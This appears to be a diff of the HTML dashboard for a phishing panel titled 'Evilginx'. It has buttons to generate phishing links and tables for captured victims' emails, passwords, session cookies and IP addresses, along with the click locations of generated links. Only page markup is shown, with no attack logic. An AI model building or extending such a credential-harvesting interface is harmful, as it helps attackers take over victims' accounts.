@@ -1,52 +1,54 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard</title>
-    <link rel="stylesheet" href="styles.css">
-
-    <!-- ✅ Load Firebase SDK from CDN -->
-    <script defer src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
-    <script defer src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js"></script>
-
-    <!-- ✅ Load Firebase Config & Main Script -->
-    <script defer src="firebase-config.js"></script>
-    <script defer src="script.js"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dashboard | Evilginx</title>
+  <link rel="stylesheet" href="styles.css">
+  <!-- Load Firebase SDK -->
+  <script defer src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+  <script defer src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
+  <script defer src="firebase-config.js"></script>
+  <script defer src="script.js"></script>
 </head>
 <body>
-    <div class="sidebar">
-        <button onclick="generateLink()" class="menu generate-link">Generate Link</button>
-        <button onclick="viewCapturedSessions()" class="menu captured-sessions">Captured Sessions</button>
-        <button onclick="viewGeneratedLinks()" class="menu generated-links">Generated Links</button>
-        <button onclick="logout()" class="menu logout">Logout</button>
-    </div>
+  <div class="sidebar">
+    <button class="menu-btn" onclick="generateLink()">Generate Link</button>
+    <button class="menu-btn" onclick="viewCapturedSessions()">Captured Sessions</button>
+    <button class="menu-btn" onclick="viewGeneratedLinks()">Generated Links</button>
+    <button class="menu-btn" onclick="logout()">Logout</button>
+  </div>
+  <div class="content">
+    <h2>Dashboard</h2>
 
-    <div class="content">
-        <h3>Captured Sessions</h3>
-        <table border="1">
-            <thead>
-                <tr>
-                    <th>Email</th>
-                    <th>Password</th>
-                    <th>Cookies</th>
-                    <th>IP</th>
-                </tr>
-            </thead>
-            <tbody id="capturedSessions"></tbody>
-        </table>
+    <h3>Captured Sessions</h3>
+    <table>
+      <thead>
+        <tr>
+          <th>Email</th>
+          <th>Password</th>
+          <th>Cookies</th>
+          <th>IP</th>
+        </tr>
+      </thead>
+      <tbody id="capturedSessions">
+        <!-- Captured sessions will be populated here -->
+      </tbody>
+    </table>
 
-        <h3>Generated Links History</h3>
-        <table border="1">
-            <thead>
-                <tr>
-                    <th>URL</th>
-                    <th>Clicked Location</th>
-                    <th>IP Address</th>
-                </tr>
-            </thead>
-            <tbody id="generatedLinks"></tbody>
-        </table>
-    </div>
+    <h3>Generated Links History</h3>
+    <table>
+      <thead>
+        <tr>
+          <th>URL</th>
+          <th>Clicked Location</th>
+          <th>IP Address</th>
+        </tr>
+      </thead>
+      <tbody id="generatedLinks">
+        <!-- Generated links will be populated here -->
+      </tbody>
+    </table>
+  </div>
 </body>
 </html>
